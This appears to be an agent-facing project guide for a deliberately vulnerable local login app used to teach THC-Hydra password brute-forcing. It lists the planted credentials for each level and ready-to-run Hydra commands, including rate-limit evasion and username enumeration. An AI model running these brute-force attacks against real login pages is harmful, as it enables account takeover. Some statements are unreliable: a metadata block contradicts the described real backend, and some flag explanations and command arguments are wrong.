---
title: "Agents.md - AI Assistant Guide for Hydra Training Playground"
version: "1.0.0"
safe_deployment: "local_only"
platforms:
  - "Local Development (maybe with DDNS)"
target_tools:
  - "THC-Hydra"
languages:
  - "React 19.1.1"
  - "TypeScript"
last_updated: "2026-01-19"
mcp_context7: true
---

# Agents.md - AI Assistant Guide for Hydra Learning Project

## Table of contents
- Overview
- Project Architecture
- Technology Stack
- Key Components to Implement
- Security Considerations
- Development Guidelines
- Common Commands & Tools

## Overview

<!-- apidoc
{
  "section": "Overview",
  "description": "High-level project summary and goals",
  "audience": ["students","instructors","AI-agents"]
}
-->

**Project Name**: Hydra Training Playground  
**Version**: 1.0.0  
**Purpose**: Educational cybersecurity training platform  
**Target Audience**: Cybersecurity students and professionals  

This is an educational cybersecurity project designed to teach students how to use **THC-Hydra** for ethical password brute-force attacks against login forms. The project provides a vulnerable web application built with React, TypeScript, and Tailwind CSS that serves as a practice target for penetration testing techniques.

## ⚠️ Educational Purpose & Compliance

**IMPORTANT**: This project is strictly for educational purposes in cybersecurity training. It should only be used in controlled environments with explicit permission.

**Compliance Requirements**:
- ✅ Local development only (not for public deployment)
- ✅ Educational vulnerabilities (weak credentials + rate limiting)
- ✅ Real Express backend with actual rate limiting
- ✅ Educational content with proper warnings
- ✅ Ethical hacking principles embedded

## Project Architecture

<!-- apidoc
{
  "section": "Project Architecture",
  "type": "structure",
  "entries": ["directory-structure","components","pages"]
}
-->

### Directory Structure
```
hydra-training-playground/
├── public/                      # Static assets and favicons
├── src/                         # Frontend source code (TypeScript)
│   ├── components/             # Reusable UI components
│   │   ├── Footer.tsx         # Footer component
│   │   ├── LoginCard.tsx      # Login level card component
│   │   ├── LoginForm.tsx      # Authentication form component
│   │   ├── Navbar.tsx         # Navigation bar component
│   │   └── SecurityCard.tsx   # Security notice component
│   ├── pages/                 # Route-level page components
│   │   ├── MainPage.tsx       # Landing page with level selection
│   │   ├── LoginPage.tsx      # Dynamic login page for all levels
│   │   ├── SuccessPage.tsx    # Post-authentication success page
│   │   ├── NotFoundPage.tsx   # 404 error page
│   │   └── SecretPage.tsx     # Hidden easter egg page
│   ├── utils/                 # Pure utility functions and helpers
│   │   └── logs.ts            # Client-side logging utilities
│   ├── types.ts               # TypeScript type definitions
│   ├── App.tsx                # Main app component with routing
│   ├── main.tsx               # Application entry point
│   └── index.css              # Global styles and Tailwind imports
├── server/                      # Backend Express server
│   ├── src/
│   │   ├── index.ts           # Express server entry point
│   │   ├── logs.ts            # Server-side logging to JSONL
│   │   └── services/
│   │       └── authService.ts # Authentication logic for all levels
│   ├── package.json           # Server dependencies
│   └── tsconfig.json          # Server TypeScript config
├── server-logs/                 # Generated log files (JSONL format)
├── old/                         # Legacy components (to be removed)
├── package.json                 # Frontend dependencies and npm scripts
├── vite.config.ts               # Vite build configuration
├── tsconfig.json                # TypeScript configuration
├── eslint.config.js             # ESLint rules and settings
├── Agents.md                    # AI assistant documentation
└── README.md                    # Main project documentation
```

## Technology Stack

<!-- apidoc
{
  "section": "Technology Stack",
  "primary": ["React","TypeScript","Vite","Tailwind"],
  "target_environment": "Kali Linux"
}
-->

### Core Technologies

**Frontend:**
- **Framework**: React 19.1.1 with TypeScript
- **Styling**: Tailwind CSS 4.1.14 (Dark theme focused)
- **Routing**: React Router 7.9.4 (use `react-router`, not `react-router-dom`)
- **Build Tool**: Vite 7.1.7
- **HTTP Client**: Axios 1.12.2
- **Development**: Hot Module Replacement (HMR) enabled

**Backend:**
- **Framework**: Express 4.18.2
- **Rate Limiting**: express-rate-limit 8.1.0 (for Level 4)
- **Slow Down**: express-slow-down 3.0.0 (for Level 3)
- **CORS**: cors 2.8.5
- **Logging**: morgan 1.10.0
- **Body Parsing**: body-parser 1.20.2
- **Development**: ts-node-dev 2.0.0

### Architecture & Deployment
- **Architecture**: Client-Server application (React frontend + Express backend)
- **Deployment**: Local development environment (requires both client and server running)
- **Data Persistence**: Server-side JSONL files for logs + localStorage for client-side data
- **Security Approach**: Educational vulnerabilities with real rate limiting and logging (safe for controlled environments)

### Target Environment
- **Primary OS**: Kali Linux (student environment)
- **Target Tool**: THC-Hydra (password brute-force attacks)
- **Wordlists**: `/usr/share/wordlists/` (rockyou.txt, fasttrack.txt) and seclists
- **Testing Approach**: Dictionary attacks with progressive difficulty across 5 levels

## Professional Development Standards

This project must be developed following **professional industry standards** and **modular architecture principles**:

### 🏗️ **Modular Architecture Requirements**
- **Component-Based Design**: Each UI element should be a reusable, self-contained component
- **Separation of Concerns**: Clear separation between UI, business logic, and data management
- **Single Responsibility Principle**: Each module/component should have one clear purpose
- **Dependency Injection**: Use props, context, and hooks for data flow management
- **Scalable Structure**: Code organization that supports future expansion and maintenance

### 📋 **Code Quality Standards**
- **TypeScript Strict Mode**: Full type safety with no `any` types
- **ESLint Compliance**: Zero linting errors, enforced coding standards
- **Consistent Formatting**: Prettier integration for code formatting
- **Comprehensive Comments**: JSDoc comments for all functions and components
- **Error Handling**: Proper try-catch blocks and error boundaries
- **Performance Optimization**: Lazy loading, memoization where appropriate

### 🔧 **Development Best Practices**
- **Git Workflow**: Conventional commits, feature branches, proper versioning
- **Testing Strategy**: Unit tests for utility functions, integration tests for components
- **Documentation**: Inline comments, README files, and technical documentation
- **Code Reviews**: All code should be reviewable and maintainable
- **Security First**: No hardcoded secrets, proper input validation
- **Accessibility**: WCAG compliance for educational inclusivity

### 🎯 **Educational Value Enhancement**
- **Clean Code Examples**: Students learn professional coding practices
- **Industry-Ready Architecture**: Prepares students for real-world development
- **Maintainable Codebase**: Easy to extend and modify for different scenarios
- **Documentation Culture**: Emphasizes the importance of proper documentation
- **Collaborative Development**: Code structure that supports team development

## Project Purpose & Learning Objectives

This project helps students learn:

1. **Web Application Security Testing**: Understanding how login forms can be vulnerable to brute-force attacks
2. **THC-Hydra Mastery**: Practical experience with http-post-form attacks, rate limiting evasion, and username enumeration
3. **Rate Limiting Techniques**: Understanding and bypassing different rate limiting strategies (slow-down vs hard limits)
4. **Ethical Hacking Principles**: Responsible disclosure and controlled testing environments
5. **Attack Strategy**: Progressive difficulty from basic dictionary attacks to advanced username enumeration

## Application Architecture

### Main Application Structure
```
Main Page (Dark Theme)
├── Links to 5 Login Levels (increasing difficulty)
└── SecretPage (easter egg)

Each Login Level:
├── Identical visual design (realistic login form)
├── Different security mechanism:
│   ├── Level 1-2: No protection
│   ├── Level 3: Progressive slow-down
│   ├── Level 4: Hard rate limit (10 req/60s)
│   └── Level 5: Username enumeration required
├── Success → Congratulations page
└── Logs → Server-side JSONL files (server-logs/attempts.jsonl)
```

## Key Components to Implement

<!-- apidoc
{
  "section": "Key Components",
  "components": ["MainPage","LoginPage","SuccessPage","ServerLogging"],
  "vulnerability_model": "weak credentials + real rate limiting"
}
-->

### 1. Main Landing Page
- **Location**: `src/pages/MainPage.tsx`
- **Features**:
  - Dark theme with realistic corporate design
  - 5 clickable cards/buttons leading to different login challenges
  - Clean, professional appearance
  - No educational content visible (content provided elsewhere)

### 2. Dynamic Login Page (5 Levels)
- **Location**: `src/pages/LoginPage.tsx`
- **Design**: Single component that handles all 5 levels via route param `/login/:level`
- **Functionality**: Sends credentials to backend endpoint `/login/{level}`
- **Success Flow**: Redirect to `/success` page after successful authentication

### 3. Security Levels Implementation

#### Level 1: Basic Dictionary Attack (Easy)
- **Credentials**:
  - `admin:adminadmin` (fasttrack top 200)
  - `Davlos:crazygirl` (social engineering for username and rockyou top 3000)
- Simple username/password combinations
- No rate limiting or protection
- Target: Learn basic Hydra syntax and HTTP POST form attacks

#### Level 2: Medium Dictionary Attack (Medium)
- **Credentials**: `admin:amorcito` (rockyou top 500)
- Standard dictionary attack with common passwords
- Requires understanding of request manipulation
- Target: Learn to use wordlists effectively

#### Level 3: Advanced Dictionary + Rate Limiting (Hard)
- **Credentials**: `admin:princess` (fasttrack top 260 / rockyou top 10)
- **Rate Limiting**: express-slow-down (progressive delay after 3 attempts)
  - Initial requests: full speed
  - After 3 requests: delays increase by 100ms per attempt
  - Window: 60 seconds
- Target: Learn rate limiting evasion with `-t` and `-W` flags

#### Level 4: Advanced Dictionary + Rate Limiting (Expert)
- **Credentials**: `admin:P@55w0rd` (fasttrack top 90 / rockyou top 190.000)
- **Rate Limiting**: express-rate-limit (hard block after 10 attempts)
  - Limit: 10 requests per 60 seconds
  - Response: 429 status with "Invalid credentials" message
  - IPv6 subnet: /56 for IP tracking
- Target: Learn advanced throttling and timing strategies

#### Level 5: Hybrid Attack Challenge (Extreme)
- **Credentials**: `test:sweetie` (rockyou top 170)
- Different username (not 'admin')
- Requires username enumeration techniques
- Target: Master username enumeration with `-L` flag and advanced Hydra strategies

### 4. Honeypot Implementation (Optional - can be enable by the admin)
- **Location**: `server/src/services/authService.ts` (lines 23-26)
- **Status**: Implemented
- **How it works**:
  ```typescript
  if (!isHuman) {
    // return { success: true, message: 'Login successfully' };
  }
  ```
- **Activation**: Uncomment line 25 to enable honeypot
- **Effect when enabled**:
  - Automated tools (Hydra) receive fake success response
  - Manual browser logins work normally (isHuman=true)
  - All automated attempts logged with `isHuman: false`
  - Educational purpose: Detect and track automated attacks
- **Detection**: Backend automatically sets `isHuman=false` for requests without the flag
- **Use case**: Tarpit technique to waste attacker's time with false positives

### 5. Logging System (Server-Side)
- **Location**: `server/src/logs.ts`
- **Storage**: JSONL files in `server-logs/attempts.jsonl`
- **IP Tracking**: Captures client IP from request
- **Data Points**:
  - Timestamp (ISO format)
  - Client IP address
  - Username attempted
  - Password attempted
  - Success/failure status
  - Level targeted (1-5)
  - isHuman flag (true from browser, false from Hydra)
  - Error message returned
- **Export Format**: JSONL (JSON Lines) for easy parsing and analysis

## Development Guidelines for AI Agents

### When Working on This Project:

1. **Professional Standards**: Follow all the professional development standards outlined above
2. **Modular Architecture**: Ensure all code follows component-based design principles
3. **Security Context**: Always remember this is for education - implement intentional vulnerabilities responsibly
4. **User Experience**: Make the learning process clear and engaging
5. **Documentation**: Include extensive comments explaining security concepts
6. **Code Quality**: Maintain ESLint compliance and TypeScript strict mode
7. **Styling**: Use Tailwind CSS classes consistently with the existing setup
8. **Testing**: Write maintainable, reviewable code that can be easily tested

### File Organization Best Practices:

- **Components**: Place reusable UI components in `src/components/`
- **Pages**: Create new routes/pages in `src/pages/`
- **Types**: Define TypeScript interfaces in component files or separate type files
- **Utilities**: Helper functions should be organized logically
- **Styles**: Use Tailwind classes primarily, custom CSS in `index.css` if needed

### Common Tasks You May Be Asked to Implement:

1. **Login Forms**: Create vulnerable authentication forms
2. **API Endpoints**: Mock or implement authentication services
3. **UI Components**: Build educational interfaces and dashboards
4. **Routing**: Add new pages for different attack scenarios
5. **Styling**: Apply Tailwind CSS for responsive, modern UI

## Available Scripts

**Frontend:**
```bash
npm run dev          # Start Vite development server (port 5173)
npm run build        # Build frontend for production
npm run lint         # Run ESLint on frontend code
npm run preview      # Preview production build
```

**Backend:**
```bash
npm run server:dev   # Start Express server in development mode (port 5000)
npm run server:start # Start Express server in production mode
cd server && npm run build  # Compile TypeScript backend to JavaScript
```

**Combined (requires running in separate terminals):**
```bash
# Terminal 1
npm run dev

# Terminal 2  
npm run server:dev
```

## Security Considerations for AI Agents

<!-- apidoc
{
  "section": "Security Considerations",
  "safe_for_deploy": true,
  "notes": "No server-side vulnerabilities; all behaviours simulated client-side"
}
-->

### Local Development Deployment Strategy:
This project is designed for **local development environments** with controlled access:
- **Real server-side logic**: Express backend with actual rate limiting and authentication
- **Educational vulnerabilities**: Intentionally weak credentials for brute-force practice
- **Logging system**: All attempts logged to JSONL files for analysis
- **Safe for local use**: Should only be run in controlled lab environments, not public internet
- **No actual exploitation**: Vulnerabilities are limited to weak credentials and rate limiting

### Do:
- Implement educational vulnerabilities that demonstrate real-world issues
- Add clear warnings about ethical use and controlled environment requirements
- Include comprehensive documentation
- Create realistic but safe attack scenarios
- Use intentionally weak credentials for educational purposes
- Implement real rate limiting to teach evasion techniques
- Log all attempts for post-analysis learning

### Don't:
- Deploy this to public internet (local development only)
- Use production-grade security (defeats educational purpose)
- Store sensitive or real user data
- Implement vulnerabilities beyond weak credentials and rate limiting
- Create anything that could be exploited outside the learning environment

## Common Hydra Commands Students Will Learn

Replace `<TARGET_IP>` with the actual server IP or hostname (e.g., `localhost`, `192.168.1.100`, or `whatever.duckdns.org`).

```bash
# ===================================================================
# Level 1: Basic Dictionary Attack (Easy)
# Credentials: admin:adminadmin (fasttrack top 200) OR Davlos:crazygirl (rockyou top 3000)
# ===================================================================
hydra -l admin -P /usr/share/wordlists/fasttrack.txt <TARGET_IP> http-post-form \
  "/login/1:username=^USER^&password=^PASS^:F=incorrect" -t 10 -V -s 5000

# Flags explained:
# -l admin          : Single username to test
# -P wordlist       : Password wordlist file
# -t 10            : Number of parallel tasks (threads)
# -V               : Verbose mode (shows each attempt)
# -s 5000          : Custom port (backend runs on 5000)
# F=incorrect      : Failure condition (text that appears when login fails)

# Alternative for second credential (Davlos:crazygirl):
hydra -l Davlos.txt -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form \
  "/login/1:username=^USER^&password=^PASS^:F=incorrect" -t 10 -V -s 5000


# ===================================================================
# Level 2: Medium Dictionary Attack (Medium)
# Credentials: admin:amorcito (rockyou top 500)
# ===================================================================
hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form \
  "/login/2:username=^USER^&password=^PASS^:F=Invalid credentials" -t 10 -s 5000

# Note: Different failure message than Level 1 ("Invalid credentials" vs "incorrect")


# ===================================================================
# Level 3: Rate Limiting Evasion - Progressive Slow-down (Hard)
# Credentials: admin:princess (fasttrack top 260 / rockyou top 10)
# Rate Limiting: express-slow-down (delays increase after 3 requests)
# ===================================================================
hydra -l admin -P /usr/share/wordlists/fasttrack.txt <TARGET_IP> http-post-form \
  "/login/3:username=^USER^&password=^PASS^:F=Invalid credentials" -t 1 -s 5000 -V

# Flags for rate limiting:
# -t 1             : CRITICAL - Only 1 thread to avoid triggering rate limits
# No -W flag       : Let Hydra handle timing naturally

# Strategy: Single-threaded attack bypasses progressive slow-down


# ===================================================================
# Level 4: Hard Rate Limit Bypass - 10 requests/60s (Expert)
# Credentials: admin:P@55w0rd (fasttrack top 90 / rockyou top 190,000)
# Rate Limiting: express-rate-limit (hard block after 10 requests per minute)
# ===================================================================
hydra -l admin -P /usr/share/wordlists/fasttrack.txt <TARGET_IP> http-post-form \
  "/login/4:username=^USER^&password=^PASS^:F=Invalid credentials" -t 10 -s 5000 -V -c 1

# Flags for hard rate limiting:
# -t 10            : Use available connections (but limited by -c)
# -c 1             : CRITICAL - Complete login check (slower but respects rate limit)
# -V               : Monitor to see when rate limit triggers (429 responses)

# Strategy: The -c flag ensures each attempt completes before next one starts


# ===================================================================
# Level 5: Username Enumeration + Dictionary Attack (Extreme)
# Credentials: test:sweetie (rockyou top 170)
# Challenge: Username is NOT 'admin' - requires enumeration
# ===================================================================

# STEP 1: Username Enumeration
# Try common usernames with a dummy password to find valid username
hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt \
  -p 1234 <TARGET_IP> http-post-form \
  "/login/5:username=^USER^&password=^PASS^:F=Invalid credentials" \
  -t 10 -s 5000 -V -I

# Flags explained:
# -L wordlist      : Username wordlist (trying multiple usernames)
# -p 1234          : Single dummy password
# -I               : Ignore existing restore file (fresh start)
# F=Invalid credentials : Different error message indicates valid user

# Look for different error messages:
# "Invalid credentials" = User exists, password wrong
# "User not found" = User doesn't exist

# STEP 2: Password Attack (after finding username 'test')
hydra -l test -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form \
  "/login/5:username=^USER^&password=^PASS^:F=Password incorrect" \
  -t 10 -s 5000 -V -I

# Note: Error message changed to "Password incorrect" after valid username
# This confirms username enumeration worked


# ===================================================================
# Advanced Techniques
# ===================================================================

# Creating custom wordlist from web scraping:
cewl -d 2 -m 5 http://<TARGET_IP>:5173 -w custom_words.txt

# Combining username and password lists for Level 5:
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form \
  "/login/5:username=^USER^&password=^PASS^:F=Invalid" -u -f -t 10 -s 5000

# Additional useful flags:
# -u               : Try all users with one password before moving to next password
# -f               : Stop after first valid credential found
# -o results.txt   : Save results to file
# -I               : Ignore restore file (useful for retrying)
```

## Kali Linux Wordlists Integration

This project is specifically designed to work with **Kali Linux** default wordlists:

### Primary Wordlists Used:
- `/usr/share/wordlists/fasttrack.txt` - Used in Levels 1, 3, and 4
- `/usr/share/wordlists/rockyou.txt` - Used in Levels 1, 2, and 5
- `/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt` - Username enumeration in Level 5

### Wordlist Preparation:
```bash
# Extract rockyou if compressed (standard in Kali Linux)
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# Install seclists if not available (for Level 5 username enumeration)
sudo apt install seclists
```

## Expected Student Workflow

1. **Setup**: 
   - Clone repository
   - Install dependencies: `npm install` and `cd server && npm install`
   - Start backend: `npm run server:dev` (port 5000)
   - Start frontend: `npm run dev` (port 5173)
   - Access application at `http://localhost:5173`

2. **Exploration**: 
   - Browse the 5 login levels
   - Understand the login mechanisms
   - Test manual login attempts

3. **Preparation**: 
   - Create custom wordlists with actual credentials
   - Or use rockyou.txt with proper filtering
   - Review Hydra syntax for http-post-form

4. **Attack**: 
   - Use Hydra against `localhost:5000/login/{level}`
   - Progress from Level 1 (easy) to Level 5 (extreme)
   - Learn different Hydra flags and techniques

5. **Analysis**: 
   - Review server logs in `server-logs/attempts.jsonl`
   - Understand rate limiting responses
   - Analyze successful vs failed attempts

6. **Mitigation**: 
   - Learn how rate limiting protects systems
   - Understand importance of strong passwords
   - Study defense techniques against brute-force attacks

## Integration with Educational Environment

This project is designed for:
- **Cybersecurity Bootcamps**: Hands-on penetration testing training
- **University Courses**: Applied security coursework
- **Self-Learning**: Individual skill development
- **Workshops**: Interactive security demonstrations

## AI Agent Interaction Guidelines

When students or instructors request modifications:
1. **Clarify Educational Goals**: Understand what security concept they're trying to teach/learn
2. **Maintain Project Structure**: Keep the existing React/TypeScript/Tailwind architecture
3. **Add Progressive Complexity**: Build from simple to advanced attack scenarios
4. **Include Learning Materials**: Provide context and explanations in code comments
5. **Test Thoroughly**: Ensure both the vulnerable app and attack scenarios work as expected

## Future Enhancements

Potential additions to consider:
- Multiple attack vectors (educational simulations only)
- Different authentication mechanisms (OAuth, JWT, etc.)
- Advanced evasion techniques
- Defensive measures demonstration
- Integration with other security tools

---

*This documentation should be updated as the project evolves to maintain accuracy for AI agents working on educational cybersecurity content.*